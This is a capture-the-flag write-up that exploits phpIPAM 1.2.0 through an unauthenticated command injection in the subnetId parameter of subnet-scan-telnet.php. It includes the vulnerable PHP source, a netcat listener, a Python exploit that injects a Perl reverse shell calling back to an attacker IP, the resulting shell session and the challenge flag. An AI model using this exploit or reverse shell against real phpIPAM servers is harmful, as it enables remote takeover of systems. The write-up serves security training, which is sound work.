# Chapter 2: Origins

## Challenge

Hi, TCC-CSIRT analyst,

Do you know the feeling when, after a demanding shift, you fall into lucid dreaming and even in your sleep, you encounter tricky problems? Help a colleague solve tasks in the complex and interconnected world of LORE, where it is challenging to distinguish reality from fantasy.

The entry point to LORE is at `http://intro.lore.tcc`.

See you in the next incident!

Hint: Be sure you enter the flag for the correct chapter.

## Solution

### 1. Entry Point Discovery

The entry point for this challenge is located at: `http://pimpam.lore.tcc/`.

Upon visiting the site, we discovered it was running an open-source application called **phpIPAM**. The source code for this application can be found here:  
[phpIPAM GitHub Repository](https://github.com/phpipam/phpipam).

### 2. Version Inspection

We inspected the version running on the server by visiting `http://pimpam.lore.tcc/misc/CHANGELOG`. The site was running **phpIPAM version 1.2.0**, which is very outdated (the latest version is 1.7.0).

We began searching for vulnerabilities related to this version. Although we found many CVEs (SQL injection, XSS), they mostly required user authentication, and we didn’t have the credentials.

### 3. Command Injection Vulnerability

While searching for vulnerabilities, we found an interesting blog post detailing vulnerabilities in phpIPAM:  
[Blog Post on phpIPAM Vulnerabilities](http://archive.justanotherhacker.com/2016/09/jahx163_-_phpipam_multiple_vulnerabilities.html).

One of the vulnerabilities mentioned was a **blind command injection** in the `subnetId` parameter of `subnet-scan-telnet.php`. This file allows for command execution without checking for user authentication.

We confirmed this by reviewing the source code of **phpIPAM 1.2.0**:  
[phpIPAM v1.2 source code](https://github.com/phpipam/phpipam/blob/1.2/app/subnets/scan/subnet-scan-telnet.php).

In the file, we noticed an `exec()` call that executes commands without verifying whether the user is logged in:

```php
<?php

/*
 * Discover new hosts with telnet scan
 *******************************/

# get ports
if(strlen($_POST['port'])==0) 	{ $Result->show("danger", _('Please enter ports to scan').'!', true); }

//verify ports
$pcheck = explode(";", str_replace(",",";",$_POST['port']));
foreach($pcheck as $p) {
	if(!is_numeric($p)) {
		$Result->show("danger", _("Invalid port")." ($p)", true);
	}
}
$_POST['port'] = str_replace(";",",",$_POST['port']);


# invoke CLI with threading support
$cmd = $Scan->php_exec." ".dirname(__FILE__) . "/../../../functions/scan/subnet-scan-telnet-execute.php $_POST[subnetId] '$_POST[port]'";

# save result to $output
exec($cmd, $output, $retval);
```

### 4. Exploitation

To exploit this vulnerability, we crafted a reverse shell using netcat to listen on port 20000:

```bash
nc -lvp 20000
```

Then, we injected the reverse shell payload into the subnetId parameter using the following Python exploit:

```python
import requests

url = 'http://pimpam.lore.tcc/app/subnets/scan/subnet-scan-telnet.php'
shell = """perl -e 'use Socket;$i="10.200.0.57";$p=20000;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'"""

data = {
    "port": 1,
    "subnetId": f"; {shell} ; "
}
r = requests.post(url, data=data)
print(r.text)
```

After running the exploit, we successfully connected to the server.

### 5. Retrieving the Flag

Once connected, we inspected the environment variables by running the **env** command:

```
connect to [10.200.0.57] from (UNKNOWN) [10.99.24.81] 33118
/bin/sh: 0: can't access tty; job control turned off
$ env
```

## Flag

```
FLAG{V51j-9ETA-Swya-8cOR}
```